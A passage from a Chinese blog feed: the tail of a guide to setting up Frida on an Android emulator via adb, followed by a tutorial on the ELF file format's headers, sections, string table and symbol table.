class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb shell</span><br><span class="line">vbox86p:/ # getprop ro.product.cpu.abi</span><br><span class="line">x86</span><br><span class="line">vbox86p:/ #</span><br></pre></td></tr></table></figure><p>查看Frida在Windows上的版本，从 <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> 下载对应Frida版本和对应安卓架构的Frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;frida --version</span><br><span class="line">15.2.2</span><br></pre></td></tr></table></figure><p><a href="https://github.com/frida/frida/releases/download/15.2.2/frida-server-15.2.2-android-x86.xz">frida-server-15.2.2-android-x86.xz</a></p><p>解压后进入到存放Frida-server目录，Shift + 右键打开Powershell。运行以下命令将Frida-server上传到安卓设备的/data/local/tmp目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\v5le0n9\Downloads&gt; adb push .\frida-server-15.2.2-android-x86 /data/local/tmp</span><br><span class="line">.\frida-server-15.2.2-android-x86: 1 file pushed, 0 skipped. 206.2 MB/s (46387888 bytes in 0.215s)</span><br><span class="line">PS C:\Users\v5le0n9\Downloads&gt;</span><br></pre></td></tr></table></figure><p>将安卓设备中的Frida-server赋予777权限并运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 frida-server-15.2.2-android-x86</span><br><span class="line">vbox86p:/data/local/tmp # ./frida-server-15.2.2-android-x86</span><br></pre></td></tr></table></figure><p>在Powershell中输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>如果存在<code>android.process.acore</code>等信息表示Windows和安卓设备的Frida框架搭建成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="http://example.com/posts/187bfa35.html"/>
    <id>http://example.com/posts/187bfa35.html</id>
    <published>2022-07-28T14:18:08.185Z</published>
    <updated>2022-07-28T14:36:34.088Z</updated>
    
    <content type="html"><![CDATA[<p>Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。</p><p>可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。</p><span id="more"></span><h1 id="1-ELF文件类型"><a href="#1-ELF文件类型" class="headerlink" title="1. ELF文件类型"></a>1. ELF文件类型</h1><ul><li>可重定位文件（<code>.o</code>文件）：文件保存着代码和适当的数据，用来和其它文件一起创建一个可执行文件或者是一个共享目标文件。</li><li>可执行文件（<code>.out</code>文件）：包含二进制代码和数据，可直接被加载器加载执行。</li><li>共享目标文件（<code>.so</code>文件）：共享库，用于和其它共享目标文件或者可重定位文件一起生成共享目标文件或者和可执行文件一起创建进程映像。</li></ul><h1 id="2-ELF文件作用"><a href="#2-ELF文件作用" class="headerlink" title="2. ELF文件作用"></a>2. ELF文件作用</h1><p>ELF文件参与程序的链接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待ELF格式的文件：</p><ol><li><p>如果用于<strong>编译和链接</strong>（可重定位文件），则<strong>编译器和链接器</strong>将把ELF文件看作是节头表描述的节的集合，程序头表可选。</p></li><li><p>如果用于<strong>加载执行</strong>（可执行文件），则<strong>加载器</strong>则将把ELF文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。</p></li></ol><img src="/posts/187bfa35/2.1.1.png" class="" title="链接阶段和执行阶段"><h1 id="3-ELF文件格式"><a href="#3-ELF文件格式" class="headerlink" title="3. ELF文件格式"></a>3. ELF文件格式</h1><p>ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，而且它们的位置也未必如图所示这样安排，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定。</p><img src="/posts/187bfa35/3.1.1.jpg" class="" title="ELF文件格式"><h2 id="3-1-ELF文件头"><a href="#3-1-ELF文件头" class="headerlink" title="3.1 ELF文件头"></a>3.1 ELF文件头</h2><p>ELF文件头描述了ELF文件的基本类型、地址偏移等信息，分为32bit和64bit两个版本，定义于Linux源码的<code>/usr/include/elf.h</code>文件中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span>&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>e_ident[EI_NIDENT];<span class="comment">//ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等【重要】</span></span><br><span class="line">  Elf32_Halfe_type;<span class="comment">//文件的标识字段标识文件的类型【重要】</span></span><br><span class="line">  Elf32_Halfe_machine;<span class="comment">//目标文件的体系结构</span></span><br><span class="line">  Elf32_Worde_version;<span class="comment">//目标文件的体系结构版本</span></span><br><span class="line">  Elf32_Addre_entry;<span class="comment">//程序的虚拟入口地址，如果文件没有对应的入口可以为0【重要】</span></span><br><span class="line">  Elf32_Offe_phoff;<span class="comment">//文件中程序头表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Offe_shoff;<span class="comment">//文件中段表/节表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Worde_flags;<span class="comment">//处理器相关的标志位，宏格式为EF_machine_flags比如EF_MIPS_PIC</span></span><br><span class="line">  Elf32_Halfe_ehsize;<span class="comment">//ELF文件头的大小(bytes)【重要】</span></span><br><span class="line">  Elf32_Halfe_phentsize;<span class="comment">//程序头表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_phnum;<span class="comment">//程序头表中的项数，也就是说程序头表的实际大小为ephentsize × e_phnum，如果文件中没有程序头表该项为0</span></span><br><span class="line">  Elf32_Halfe_shentsize;<span class="comment">//节表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_shnum;<span class="comment">//节表中项的数量</span></span><br><span class="line">  Elf32_Halfe_shstrndx;<span class="comment">//节表中节名的索引，如果文件没有该表则该项为SHN_UNDEF(0)</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>数据类型说明：</p><div class="table-container"><table><thead><tr><th>名称</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td>unsigned char</td><td>1</td><td>无符号小整数</td></tr><tr><td>Elf32_Half</td><td>2</td><td>无符号中等大小整数</td></tr><tr><td>Elf32_Word</td><td>4</td><td>无符号大整数</td></tr><tr><td>Elf32_Addr</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Off</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>有符号大整数</td></tr></tbody></table></div><p>64bit和32bit仅仅只是字长的区别，字段上没有实际上的差别。</p><p>某些成员的相关参数：</p><p><code>e_ident[EI_NIDENT]</code>：ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等。</p><img src="/posts/187bfa35/3.1.2.png" class="" title="e_iden[EI_NIDENT]"><ul><li>前4字节为魔数，取值为固定的0x7F454C46，标记当前文件为一个ELF文件。</li><li>第5个字节表明当前文件类别：0表示非法，1表示32bit，2表示64bit。</li><li>第6个字节表明当前文件的数据排列方式：0表示非法，1表示小端，2表示大端。</li><li>第7个字节表明当前文件的版本：0表示未知，1表示当前版本。</li><li>第某个字节是<code>EI_PAD</code>的起点，即<code>e_ident[EI_PAD]</code>表明<code>e_ident</code>中未使用的字节的起点，未使用的字节会被初始化为0，解析ELF文件时需要忽略对应的字段。</li></ul><p><code>e_type</code>：文件的标识字段标识文件的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>ET_NONE(0)</td><td>未知的文件格式</td></tr><tr><td>ET_REL(1)</td><td>可重定位文件</td></tr><tr><td>ET_EXEC(2)</td><td>可执行文件</td></tr><tr><td>ET_DYN(3)</td><td>共享目标文件</td></tr><tr><td>ET_CORE(4)</td><td>Core转储文件，比如程序crash后的转储文件</td></tr><tr><td>ET_LOPROC(0xff00)</td><td>特定处理器的文件标识</td></tr><tr><td>ET_HIPROC(0xffff)</td><td>特定处理器的文件标识</td></tr><tr><td>[ET_LOPROC, ET_HIPROC]</td><td>区间的值用来表示特定处理器的文件格式</td></tr></tbody></table></div><p><code>e_machine</code>：目标文件的体系结构。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>EM_NONE(0)</td><td>未知的处理器架构</td></tr><tr><td>EM_M32(1)</td><td>AT&amp;T WE 32100</td></tr><tr><td>EM_SPARC(2)</td><td>SPARC</td></tr><tr><td>EM_386(3)</td><td>Intel 80386</td></tr><tr><td>EM_68K(4)</td><td>Motorola 68000</td></tr><tr><td>EM_88K(5)</td><td>Motorola 88000</td></tr><tr><td>EM_860(6)</td><td>Intel 80860</td></tr><tr><td>EM_MIPS(7)</td><td>MIPS RS3000大端</td></tr><tr><td>EM_MIPS_RS4_BE(10)</td><td>MIPS RS4000大端</td></tr><tr><td>其他</td><td>预留</td></tr></tbody></table></div><h2 id="3-2-程序头表"><a href="#3-2-程序头表" class="headerlink" title="3.2 程序头表"></a>3.2 程序头表</h2><p>可执行文件或共享目标文件的程序头表是一个结构数组，每个元素描述了一个段或者系统准备程序执行所必需的其它信息。程序头表描述了ELF文件中Segment在文件中的布局，描述了OS该如何装载可执行文件到内存。程序头表的表项的描述如下，类似于ELF Header也有32和64位两个版本。但程序头表的相关字段偏移有些差别。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span> &#123;</span></span><br><span class="line">Elf32_Word p_type;<span class="comment">//当前Segment的类型</span></span><br><span class="line">Elf32_Off p_offset;<span class="comment">//当前段相对于文件起始位置的偏移量</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//段的第一个字节将被映射到到内存中的虚拟地址</span></span><br><span class="line">Elf32_Addr p_paddr;<span class="comment">//此成员仅用于与物理地址相关的系统中</span></span><br><span class="line">Elf32_Word p_filesz;<span class="comment">//段在文件映像中所占的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_memsz;<span class="comment">//段在内存映像中占用的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_flags;<span class="comment">//段相关的标志</span></span><br><span class="line">Elf32_Word p_align;<span class="comment">//段在文件中和内存中如何对齐</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_phdr</span> &#123;</span></span><br><span class="line">Elf64_Word p_type;</span><br><span class="line">Elf64_Word p_flags;</span><br><span class="line">Elf64_Off p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">Elf64_Addr p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">Elf64_Addr p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">Elf64_Xword p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">Elf64_Xword p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">Elf64_Xword p_align;<span class="comment">/* Segment alignment, file &amp; memory */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>p_type</code>：当前Segment的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>PT_NULL(0)</td><td>当前项未使用，项中的成员是未定义的，需要忽略当前项</td></tr><tr><td>PT_LOAD(1)</td><td>当前Segment是一个可装载的Segment，即可以被装载映射到内存中，其大小由<code>p_filesz</code>和<code>p_memsz</code>描述。如果<code>p_memsz &gt; p_filesz</code>则剩余的字节被置零，但是<code>p_filesz &gt; p_memsz</code>是非法的。动态库一般包含两个该类型的段：代码段和数据段</td></tr><tr><td>PT_DYNAMIC(2)</td><td>动态段、动态库特有的段，包含了动态链接必须的一些信息，比如需要链接的共享库列表、GOT等等</td></tr><tr><td>PT_INTERP(3)</td><td>当前段用于存储一段以NULL为结尾的字符串，该字符串表明了程序解释器的位置。且当前段仅仅对于可执行文件有实际意义，一个可执行文件中不能出现两个当前段</td></tr><tr><td>PT_NOTE(4)</td><td>用于保存与特定供应商或者系统相关的附加信息以便于兼容性、一致性检查，但是实际上只保存了操作系统的规范信息</td></tr><tr><td>PT_SHLIB(5)</td><td>保留段</td></tr><tr><td>PT_PHDR(6)</td><td>保存程序头表本身的位置和大小，当前段不能在文件中出现一次以上，且仅仅当程序头表为内存映像的一部分时起作用，它必须在所有加载项目之前</td></tr><tr><td>[PT_LPROC(0x70000000), PT_HIPROC(0x7fffffff)]</td><td>该范围内的值用作预留</td></tr></tbody></table></div><img src="/posts/187bfa35/3.2.1.png" class="" title="程序头表"><h2 id="3-3-节头表"><a href="#3-3-节头表" class="headerlink" title="3.3 节头表"></a>3.3 节头表</h2><p>节头表描述了ELF文件中的节的基本信息。可执行文件不一定有节头表但是一定有节，节头表可利用特殊的方式去除。节头表是也是一个结构数组，每个元素描述了不同的节。</p><p>段和节的区别是：</p><ul><li>段包含了程序装载可执行的基本信息，段告诉OS如何装载当前段到虚拟内存以及当前段的权限和执行相关的信息等，一个段可以包含0个或多个节；</li><li>节包含了程序的代码和数据等内容，链接器会将多个节合并为一个段。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span> &#123;</span></span><br><span class="line">  Elf32_Wordsh_name;<span class="comment">//值是节名称在字符串表中的索引</span></span><br><span class="line">  Elf32_Wordsh_type;<span class="comment">//描述节的类型和语义</span></span><br><span class="line">  Elf32_Wordsh_flags;<span class="comment">//1bit位的标志位</span></span><br><span class="line">  Elf32_Addrsh_addr;<span class="comment">//如果当前节需要被装载到内存，则当前项存储当前节映射到内存的首地址，否则应该为0</span></span><br><span class="line">  Elf32_Offsh_offset;<span class="comment">//当前节的首地址相对于文件的偏移</span></span><br><span class="line">  Elf32_Wordsh_size;<span class="comment">//节的大小。但是对于类型为SHT_NOBITS的节，当前值可能不为0但是在文件中不占据任何空间</span></span><br><span class="line">  Elf32_Wordsh_link;<span class="comment">//存储节头表中的索引，表示当前节依赖于对应的节。对于特定的节有特定的含义，其他为SHN_UNDEF</span></span><br><span class="line">  Elf32_Wordsh_info;<span class="comment">//节的附加信息。对于特定的节有特定的含义，其他为0</span></span><br><span class="line">  Elf32_Wordsh_addralign;<span class="comment">//地址约束对齐，值应该为0或者2的幂次方，0和1表示未进行对齐</span></span><br><span class="line">  Elf32_Wordsh_entsize;<span class="comment">//某些节是一个数组，对于这类节当前字段给出数组中每个项的字节数，比如符号表。如果节并不包含对应的数组，值应该为0</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>sh_type</code>：描述节的类型和语义。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL(0)</td><td>当前节是非活跃的，没有一个对应的具体的节内存</td></tr><tr><td>SHT_PROGBITS(1)</td><td>包含了程序的指令信息、数据等程序运行相关的信息</td></tr><tr><td>SHT_SYMTAB(2)</td><td>保存了符号信息，用于重定位。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_DYNSYM(11)</td><td>保存共享库导入动态符号信息。此种类型节的<code>sh_link</code>存储相关字符串表的节索引，<code>sh_info</code>存储最后一个局部符号的符号表索引+1</td></tr><tr><td>SHT_STRTAB(3)</td><td>一个字符串表，保存了每个节的节名称</td></tr><tr><td>SHT_RELA(4)</td><td>存储可重定位表项，可能会有附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_HASH(5)</td><td>存储符号哈希表，所有参与动态链接的目标只能包含一个哈希表，一个目标文件只能包含一个哈希表。此种类型节的<code>sh_link</code>存储哈希表所使用的符号表的节索引,<code>sh_info</code>为0</td></tr><tr><td>SHT_DYAMIC(6)</td><td>存储包含动态链接的信息，一个目标文件只能包含一个。此种类型的节的<code>sh_link</code>存储当前节中使用到的字符串表格的节的索引，<code>sh_info</code>为0</td></tr><tr><td>SHT_NOTE(7)</td><td>存储以某种形式标记文件的信息</td></tr><tr><td>SHT_NOBITS(8)</td><td>这种类型的节不占据文件空间，但是成员<code>sh_offset</code>依然会包含对应的偏移</td></tr><tr><td>SHT_REL(9)</td><td>包含可重定位表项，无附加内容，目标文件可能有多个可重定位表项。此种类型节的<code>sh_link</code>存储相关符号表的节索引，<code>sh_info</code>存储重定位所使用节的索引</td></tr><tr><td>SHT_SHLIB(10)</td><td>保留区，包含此节的程序与ABI不兼容</td></tr><tr><td>[SHT_LOPROC(0x70000000), SHT_HIPROC(0x7fffffff)]</td><td>留给处理器专用语义</td></tr><tr><td>[SHT_LOUSER(0x80000000), SHT_HIUSER(0xffffffff)]</td><td>预留</td></tr></tbody></table></div><p><code>sh_flags</code>：1bit位的标志位。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>SHF_WRITE(0x1)</td><td>当前节包含进程执行过程中可写的数据</td></tr><tr><td>SHF_ALLOC(0x2)</td><td>当前节在运行阶段占据内存</td></tr><tr><td>SHF_EXECINSTR(0x4)</td><td>当前节包含可执行的机器指令</td></tr><tr><td>SHF_MASKPROC(0xf0000000)</td><td>所有包含当前掩码都表示预留给特定处理器的</td></tr></tbody></table></div><img src="/posts/187bfa35/3.3.1.png" class="" title="节头表"><h3 id="3-3-1-一些特殊的节"><a href="#3-3-1-一些特殊的节" class="headerlink" title="3.3.1 一些特殊的节"></a>3.3.1 一些特殊的节</h3><p>ELF文件中用一些预定义的节来保存程序、数据和一些控制信息，这些节被用来链接或者装载程序。每个操作系统都支持一组链接模式，主要分为两类（也就是常说的动态库和静态库）：</p><ul><li>Static：静态绑定的一组目标文件、系统库和库档案（比如静态库），解析包含的符号引用并创建一个完全自包含的可执行文件；</li><li>Dynamic：一组目标文件、库、系统共享资源和其他共享库链接在一起创建可执行文件。当加载此可执行文件时必须使系统中其他共享资源和动态库可用，程序才能正常运行。</li></ul><p>库文件无论是动态库还是静态库在其文件中都包含对应的节，一些特殊的节其功能如下：</p><p><code>.bss</code>，类型<code>SHT_NOBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存储未经初始化的数据。根据定义程序开始执行时，系统会将这些数据初始化为0，且此节不占用文件空间；</p><p><code>.comment</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储版本控制信息；</p><p><code>.data</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.data1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_WRITE</code>：存放初始化的数据；</p><p><code>.debug</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存放用于符号调试的信息；</p><p><code>.dynamic</code>，类型<code>SHT_DYNAMIC</code>，属性<code>SHF_ALLOC</code>，是否有属性<code>SHF_WRITE</code>屈居于处理器：包含动态链接的信息，</p><p><code>.hash</code>，类型<code>SHT_HASH</code>，属性<code>SHF_ALLOC</code>：哈希符号表；</p><p><code>.line</code>，类型<code>SHT_PROGBITS</code>，属性<code>none</code>：存储调试的行号信息，描述源代码和机器码之间的对应关系；</p><p><code>.note</code>，类型<code>SHT_NOTE</code>，属性<code>none</code>：额外的编译器信息，比如程序的公司名、发布版本号等；</p><p><code>.rodata</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.rodata1</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC</code>：存储只读数据；</p><p><code>.shstrtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储节的名称；</p><p><code>.strtab</code>，类型<code>SHT_STRTAB</code>，属性<code>none</code>：存储常见的与符号表关联的字符串。如果文件有一个包含符号字符串表的可加载段，则该段的属性将包括<code>SHF_ALLOC</code>位； 否则，该位将关闭；</p><p><code>.symtab</code>，类型<code>SHT_SYMTAB</code>，属性<code>none</code>：存储一个符号表。如果文件具有包含符号表的可加载段，则该节的属性将包括<code>SHF_ALLOC</code>位；否则，该位将关闭；</p><p><code>.text</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储程序的代码指令；</p><p><code>.dynstr</code>，类型<code>SHT_STRTAB</code>，属性<code>SHF_ALLOC</code>：存储动态链接所需的字符串，最常见的是表示与符号表条目关联的名称的字符串；</p><p><code>.dynsym</code>，类型<code>SHT_DYNSYM</code>，属性<code>SHF_ALLOC</code>：存储动态链接符号表；</p><p><code>.fini</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程终止代码的可执行指令。 当程序正常退出时，系统执行本节代码；</p><p><code>.init</code>，类型<code>SHT_PROGBITS</code>，属性<code>SHF_ALLOC|SHF_EXECINSTR</code>：存储有助于进程初始化代码的可执行指令。 当程序开始运行时，系统会在调用主程序入口点（C 程序称为 main）之前执行本节中的代码；</p><p><code>.interp</code>，类型<code>SHT_PROGBITS</code>，<code>SHF_ALLOC</code>：保存程序解释器的路径名。 如果文件有一个包含该节的可加载段，则该节的属性将包括 <code>SHF_ALLOC</code> 位； 否则，该位将关闭；</p><p><code>.relname</code>，类型<code>SHT_REL</code>：包含重定位信息。如果文件具有包含重定位的可加载段，则这些部分的属性将包括 <code>SHF_ALLOC</code>位；否则，该位将关闭。通常，名称由 重定位适用的部分。因此<code>.text</code>的重定位部分通常具有名称<code>.rel.text</code>或<code>.rela.text</code>；</p><p><code>.relaname</code>，类型<code>SHT_RELA</code>：同relname。</p><p>其它：对于C++程序有些版本会有<code>.ctors</code>（有时也会是<code>.init_array</code>）和<code>.dtors</code>两个节存储构造和析构相关的代码。</p><h2 id="3-4-字符串表"><a href="#3-4-字符串表" class="headerlink" title="3.4 字符串表"></a>3.4 字符串表</h2><p>字符串表是一个存储字符串的表格，而每个字符串是以NULL也就是<code>\0</code>为结尾的。字符串表格中索引为0处的字符串被定义为空字符串。符号表中保存的字符串是节名和目标文件中使用到的符号。而需要使用对应字符串时，只需要在需要使用的地方指明对应字符在字符串表中的索引即可，使用的字符串就是索引处到第一个<code>\0</code>之间的字符串。</p><img src="/posts/187bfa35/3.4.1.png" class="" title="字符串表"><h2 id="3-5-符号表"><a href="#3-5-符号表" class="headerlink" title="3.5 符号表"></a>3.5 符号表</h2><p>目标文件的符号表包含定位和重定位程序的符号定义和引用所需的信息。符号表索引是该数组的下标。索引0既指定表中的第一个条目，又用作未定义的符号索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span>&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">//存储一个指向字符串表的索引来表示对应符号的名称</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">//存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">//符号的大小，具体指为sizeof(instance)，如果未知则为0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">//指定符号的类型和绑定属性</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">//该成员当前持有 0 并且没有定义的含义</span></span><br><span class="line">  Elf32_Halfst_shndx;<span class="comment">//每个符号都有属于的节，当前成员存储的就是对应节的索引</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_sym</span> &#123;</span></span><br><span class="line">  Elf64_Word st_name;<span class="comment">/* Symbol name, index in string tbl */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Type and binding attributes */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">/* No defined meaning, 0 */</span></span><br><span class="line">  Elf64_Half st_shndx;<span class="comment">/* Associated section index */</span></span><br><span class="line">  Elf64_Addr st_value;<span class="comment">/* Value of the symbol */</span></span><br><span class="line">  Elf64_Xword st_size;<span class="comment">/* Associated symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>st_value</code>：存储对应符号的取值，具体值依赖于上下文，可能是一个指针地址，立即数等。另外，不同对象文件类型的符号表条目对<code>st_value</code>成员的解释略有不同：</p><ul><li>在可重定位文件中，<code>st_value</code>保存节索引为<code>SHN_COMMON</code>的符号的对齐约束，<code>st_value</code>保存已定义符号的节偏移量。 也就是说，<code>st_value</code>是从<code>st_shndx</code>标识的部分的开头的偏移量。</li><li>在可执行文件和共享对象文件中，<code>st_value</code>保存一个虚拟地址。 为了使这些文件的符号对动态链接器更有用，节偏移（文件解释）让位于与节号无关的虚拟地址（内存解释）。</li></ul><p><code>st_info</code>：指定符号的类型和绑定属性。可以用下面的代码分别解析出<code>bind、type、info</code>三个属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(b,t) (((b)&lt;&lt;4)+((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure><ul><li>BIND：</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL(0)</td><td>局部符号在包含其定义的目标文件之外是不可见的。 同名的本地符号可以存在于多个文件中，互不干扰</td></tr><tr><td>STB_GLOBAL(1)</td><td>全局符号对所有正在组合的目标文件都是可见的。 一个文件对全局符号的定义将满足另一个文件对同一全局符号的未定义引用</td></tr><tr><td>STB_WEAK(2)</td><td>弱符号类似于全局符号，但它们的定义具有较低的优先级</td></tr><tr><td>[STB_LOPROC(13), STB_HIPROC(15)]</td><td>预留位，用于特殊处理器的特定含义</td></tr></tbody></table></div><ul><li>TYPE：</li></ul><div 